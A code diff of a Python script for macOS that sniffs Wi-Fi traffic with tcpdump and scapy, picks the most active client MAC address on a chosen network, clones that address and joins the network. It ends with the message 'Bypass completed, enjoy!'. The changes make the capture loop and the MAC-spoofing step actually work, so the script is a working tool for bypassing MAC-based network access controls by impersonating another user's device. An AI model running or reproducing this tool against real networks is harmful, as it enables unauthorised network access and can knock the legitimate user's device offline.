@@ -1,8 +1,10 @@
-from scapy.all import TCP, IP, sr1, srp, Ether, ARP, sniff, Dot11, Dot11Elt, sendp, Dot11Beacon, RadioTap, PcapNgReader, PcapReader, Dot11AssoReq, Dot11ReassoReq, Dot11Disas, Dot11AssoResp, Dot11ReassoResp
+import time
+from scapy.all import *
 import subprocess as sub
 import argparse
 import re
 import os
+
 
 IGNORE_MAC = ('ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:')
 AIRPORT = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
@@ -14,11 +16,11 @@ TCPDUMP = "/usr/sbin/tcpdump"
 def change_mac_addr_macos(interface, new_mac):
     print('\n[+] Changing the MAC Address to', new_mac)
     sub.call(['sudo', '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-z'])
+    time.sleep(2)
     sub.call(['sudo', 'ifconfig', interface, 'lladdr', new_mac])
     print('[+] MAC Address changed to', new_mac)
     
 def list_wifis_macos():
-    #sub.call(['sudo', 'ln', '-s', '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '/usr/local/bin/airport'])
     scan_cmd = sub.Popen(['sudo', 'airport', '-s'], stdout=sub.PIPE, stderr=sub.STDOUT)
     scan_out, scan_err = scan_cmd.communicate()
     scan_out_data = {}
@@ -31,41 +33,61 @@ def list_wifis_macos():
         
 
 def scan_clients(bssids, interface):
-    file_name = "/Users/ecp/Desktop/final3.pcap"
-    sub.check_call(["sudo", "ifconfig", interface, "down"])
-    sub.check_call(["sudo", "ifconfig", interface, "up"])
+    animation = "|/-\\"
+    idx = 0
+    good_packets = 0
+    stop = False
+    file_name = "test"+str(time.time()).replace(".", "") + ".pcap"
+    packet_count = 200
     sub.check_call([AIRPORT, "--disassociate"])
     clients_and_count = {}
     print('[+] Capturing Network Traffic...')
-    print('[+] Packet Limit: 5000')
-    print('[+] If it takes more than 2 minutes, CTRL+C to stop')
+    print('[+] Packet Limit: ', packet_count)
+    print('[+] If it takes more than a minute, CTRL+C to stop')
+    pcap = None
+    p = sub.Popen((['sudo', TCPDUMP, '-I', '-n', '-e', '-i' , interface, '-w', file_name]), stdout=sub.PIPE, stderr=sub.PIPE)
+    while pcap is None:
+        try:
+            pcap = PcapReader(file_name)
+        except:
+            "Waiting for packets..."
     try:
-        sub.Popen(["sudo", TCPDUMP, "-I", "-n", "-i", "en0", "-c", "5000", "-w", file_name]).wait()
+        while p is not None and not stop:
+            if good_packets > packet_count:
+                print("\n[+] Stopping capture.")
+                # killall -9 tcpdump
+                sub.Popen(['sudo', 'killall', '-9', 'tcpdump']).wait()
+                stop = True        
+            for packet in pcap:
+                if Dot11 in packet:
+                    if not packet.addr1 or not packet.addr2:
+                        continue
+                    else:
+                        addr1 = packet.addr1.lower()
+                        addr2 = packet.addr2.lower()
+                        if addr1 in IGNORE_MAC or addr2 in IGNORE_MAC or (addr1 not in bssids and addr2 not in bssids):
+                            continue
+                        else:     
+                            if addr1 in bssids:
+                                if not addr2 in clients_and_count:
+                                    clients_and_count[addr2] = 1
+                                else:
+                                    clients_and_count[addr2] += 1                           
+                                    good_packets += 1
+                            elif addr2 in bssids:
+                                if addr1 not in clients_and_count:
+                                    clients_and_count[addr1] = 1
+                                else:
+                                    clients_and_count[addr1] += 1
+                                    good_packets += 1
+                idx = (idx + 1) % len(animation)
+                c = animation[idx]
+                print(f"\r[+] Capturing packets... {c}", end="", flush=True)
     except KeyboardInterrupt:
-        print("Stopping capture.")
-    pcap = PcapReader(file_name)
-    for packet in pcap:
-        if Dot11 in packet:
-            
-            
-            if not packet.addr1 or not packet.addr2 or addr1 in IGNORE_MAC or addr2 in IGNORE_MAC or (addr1 not in bssids and addr2 not in bssids):
-                continue
-            else:
-                addr1 = packet.addr1.lower()
-                addr2 = packet.addr2.lower()
-                if addr1 in bssids:
-                    if not addr2 in clients_and_count:
-                        print("adding client: ", addr2)
-                        clients_and_count[addr2] = 1
-                    else:
-                        clients_and_count[addr2] += 1
-                elif addr2 in bssids:
-                    if addr1 not in clients_and_count:
-                        print("adding client: ", addr1)
-                        clients_and_count[addr1] = 1
-                    else:
-                        clients_and_count[addr1] += 1
-                    
+        print("\n[+] Stopping capture.")
+        sub.Popen(['sudo', 'killall', '-9', 'tcpdump']).wait()
+        stop = True
+    time.sleep(1)
     clients_and_count = sorted(clients_and_count.items(), key=lambda x: x[1], reverse=True)
     for client in clients_and_count:
         print("Mac: ", client[0], " Count: ", client[1])
@@ -100,6 +122,7 @@ def auto_mode(interface):
     ssid = input("Enter the ssid of the network you want to scan: ")
     for wifi in wifi_list:
         if wifi_list[wifi]["SSID"] == ssid:
+            print("Added: ", wifi_list[wifi]["BSSID"])
             bssids.add(wifi_list[wifi]["BSSID"])
             channels.add(wifi_list[wifi]["channel"])
     clients = scan_clients(bssids, interface)
@@ -107,8 +130,9 @@ def auto_mode(interface):
         print("No clients found")
         return
     selected_client = clients[0]
+    print(type(selected_client[0]))
     print("[+] Selected client: ", selected_client)
-    change_mac_addr_macos(interface, selected_client)
+    change_mac_addr_macos(interface, selected_client[0])
     sub.check_output(["sudo", "networksetup", "-setairportnetwork", interface, ssid])
     print("[+] Connected to network: ", ssid)
     print("[+] Bypass completed, enjoy!")
@@ -118,7 +142,6 @@ def main():
     operating_system = sub.check_output(['uname'])
     parser = argparse.ArgumentParser()
     parser.add_argument('-i', '--interface', dest='interface', help='Interface to change its MAC Address')
-    parser.add_argument('-a', '--auto', dest='auto', action='store_true', help='Automatically select the interface to change its MAC Address')
     args = parser.parse_args()
     if not args.interface:
         print('[+] Interface not provided')
@@ -131,8 +154,7 @@ def main():
     if os.geteuid() != 0:
         print('[+] Please run as root!')
         exit()
-    if args.auto:
-        auto_mode(interface)
+    auto_mode(interface)
     
     
 if __name__ == '__main__':
